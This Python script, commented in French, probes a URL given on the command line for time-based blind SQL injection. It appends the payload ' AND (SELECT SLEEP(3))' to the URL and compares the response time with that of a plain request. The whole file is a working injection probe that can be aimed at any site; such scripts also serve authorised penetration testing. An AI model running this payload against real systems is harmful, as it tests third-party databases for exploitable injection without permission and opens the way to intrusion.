import requests
import sys
import urllib.parse


url = sys.argv[1]
headers = {
    "User-Agent": "MonAgentUtilisateur/1.0",  # Exemple d'en-tête personnalisé
    "Accept-Language": "fr-FR"  # Autre exemple d'en-tête personnalisé
}

print("Test on" , url, ":")

response = requests.get(url,headers=headers)


if response.status_code == 200:
    # Temps de réponse en secondes
    response_time = response.elapsed.total_seconds()
    print("Temps de réponse :", response_time, "secondes")
else:
    # Erreur survenue
    print("Erreur :", response.status_code)



url_time_attack = url + urllib.parse.quote(" AND (SELECT SLEEP(3))")

print("Test with time attack :" , url_time_attack)

response = requests.get(url_time_attack, headers=headers)


if response.status_code == 200:
    # Temps de réponse en secondes
    response_time2 = response.elapsed.total_seconds()
    print("Temps de réponse2 :", response_time2, "secondes")
else:
    # Erreur survenue
    print("Erreur :", response.status_code)

if response_time + 2 < response_time2:
    print("Time attack detected") 